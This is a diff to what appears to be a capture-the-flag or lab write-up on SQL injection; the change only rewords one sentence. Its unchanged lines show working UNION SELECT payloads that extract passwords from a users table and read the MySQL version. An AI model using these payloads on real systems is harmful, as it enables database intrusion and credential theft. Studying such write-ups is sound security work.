@@ -62,7 +62,7 @@ SELECT * FROM anime WHERE LOWER(title) REGEXP ' union select null,password,null,
 SELECT * FROM anime WHERE LOWER(title) REGEXP 'a_big_string' union select null,password,null,null,null from users-- \'
 ```
 ![pw](./images/pass.png)
-Also from trials and errors, we have to put an additional space after the comment because the database is using `MYSQL`. If we didn't have the source code, we can try SQL injection from [PortSwigger SQLi cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) to find the database version
+Through trial and error, we discovered that we need to put an additional space after the comment because the database is MySQL. If we don't have the source code, we can try SQL injection using the [PortSwigger SQLi cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) to find the database version
 ```sql
  union select null,@@version,null,null,null-- \
 ```
